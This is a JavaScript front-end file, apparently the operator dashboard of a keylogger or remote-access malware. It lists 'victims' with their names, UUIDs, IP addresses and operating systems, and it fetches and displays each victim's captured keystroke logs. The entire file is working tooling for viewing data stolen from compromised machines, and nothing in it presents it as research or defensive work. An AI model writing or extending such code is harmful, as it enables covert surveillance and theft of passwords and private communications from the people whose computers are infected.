// Displaying victims
let displayVictims = ()=>{
    $.get("/victims", (data,status)=>{
        html = ""
        for(let i = 0;i<data.size;i++){
            if(i % 5 == 0){
                html += `<div class="row">`
            }
            html += `
                <div class="col-lg-3">
                <a href="pages/dashboard.html?UUID=${data.data[i].UUID}">
                    <div class="victim-card">
                        <div class="v-img">
                            <img src="./resources/images/window-logo.png" class="img-fluid" alt="" />
                        </div>
                        <div class="v-info">
                            <h4>${data.data[i].name}</h4>
                            <p>${data.data[i].UUID}</p>
                        </div>
                    </div>
                </a>
                </div>
            `
            if(i == 4){
                html += `</div>`
            }
        }

        if(data.size % 4 != 0){
            html += `</div>`
        }
        $("#victim_container").html(html)
    })
}

//Dashboard data loading
let createDashboard = ()=>{
    let UUID = location.search.split('UUID=')[1]
    $.get(`/victim/${UUID}`, (data)=>{   
        $("#v_name").html(data.data[0].name)
        $("#v_UUID").html(data.data[0].UUID)
        $("#v_IP").html(data.data[0].IP)
        $("#v_OS").html(data.data[0].OS)
        $("#keylog_btn").attr("href",`./keylogs.html?UUID=${UUID}`)
    })
    .fail(()=>{
        alert(`Victim with ${UUID} not found!`)
        window.location.replace("/web")
    })
}

//Fetching Keylogs
let fetchKeylogs = ()=>{
    let UUID = location.search.split('UUID=')[1]

    $.get(`/victim/${UUID}`, (data)=>{   
        $("#v_name").html(data.data[0].name)
        $("#v_UUID").html(data.data[0].UUID)
    })
    .fail(()=>{
        alert(`Victim with ${UUID} not found!`)
        window.location.replace("/web")
    })

    $.get( `/victim/${UUID}/keylogs`,(data)=>{
        console.log("I am here!")
        console.log(data)
        html = ""
        data.data.forEach(element => {
            html += 
            `<div class="row mb-4">
                <div class="col">
                    <div class="keylogs">
                        <h6>${element.timeStamp}</h6>
                        <p>${element.logs}</p>
                        <img src="../resources/images/window-logo.png" class="img-fluid img-logs" alt="">
                    </div>
                </div>
            </div>`
        });

        $("#keylogs_data").html(html)
    })
}